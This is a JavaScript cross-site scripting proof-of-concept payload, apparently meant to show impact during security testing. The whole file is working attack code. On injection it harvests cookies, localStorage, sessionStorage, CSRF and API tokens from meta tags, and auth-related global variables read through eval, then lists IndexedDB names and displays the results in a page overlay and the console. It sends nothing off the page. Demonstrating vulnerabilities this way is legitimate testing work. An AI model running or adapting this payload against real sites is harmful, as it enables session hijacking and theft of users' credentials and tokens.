// Simple XSS PoC - Client-side data extraction
(async function() {
  const findings = {
    timestamp: new Date().toISOString(),
    domain: document.domain,
    cookies: document.cookie,
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage},
    metaTags: {},
    indexedDBs: []
  };

  // Grab any tokens/sensitive data from meta tags
  ['csrf-token', '__requestverificationtoken', 'x-csrf-token', 'api-key'].forEach(attr => {
    const elem = document.querySelector(`meta[name="${attr}"]`);
    if (elem?.content) findings.metaTags[attr] = elem.content;
  });

  // Check for common global variables
  ['__INITIAL_STATE__', '__data', 'API_TOKEN', 'JWT', 'csrfToken', 'authToken'].forEach(varName => {
    try {
      const val = eval(varName);
      if (val) findings.globalVars = findings.globalVars || {};
      findings.globalVars[varName] = val;
    } catch (e) {}
  });

  // Enumerate IndexedDB
  try {
    const dbs = await indexedDB.databases();
    findings.indexedDBs = dbs.map(db => db.name);
  } catch (e) {}

  // Display on page
  const output = `
    <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.95);z-index:999999;overflow:auto;color:#0f0;font-family:monospace;font-size:13px;padding:20px;">
      <div style="background:#1a1a1a;border:2px solid #0f0;padding:15px;border-radius:5px;">
        <h2 style="color:#0f0;margin:0 0 15px 0;">XSS PoC - Data Extraction</h2>
        
        <h3 style="color:#ff6600;">Domain</h3>
        <pre>${findings.domain}</pre>

        <h3 style="color:#ff6600;">Cookies</h3>
        <pre>${findings.cookies || '(none accessible via JS - httpOnly set)'}</pre>

        <h3 style="color:#ff6600;">localStorage</h3>
        <pre>${Object.keys(findings.localStorage).length > 0 
          ? JSON.stringify(findings.localStorage, null, 2) 
          : '(empty)'}</pre>

        <h3 style="color:#ff6600;">sessionStorage</h3>
        <pre>${Object.keys(findings.sessionStorage).length > 0 
          ? JSON.stringify(findings.sessionStorage, null, 2) 
          : '(empty)'}</pre>

        <h3 style="color:#ff6600;">Meta Tags (Tokens/Keys)</h3>
        <pre>${Object.keys(findings.metaTags).length > 0 
          ? JSON.stringify(findings.metaTags, null, 2) 
          : '(none found)'}</pre>

        <h3 style="color:#ff6600;">IndexedDB Databases</h3>
        <pre>${findings.indexedDBs.length > 0 
          ? findings.indexedDBs.join(', ') 
          : '(none found)'}</pre>
      </div>
    </div>
  `;

  document.body.insertAdjacentHTML('beforeend', output);
  console.log('XSS PoC Data:', findings);
})();
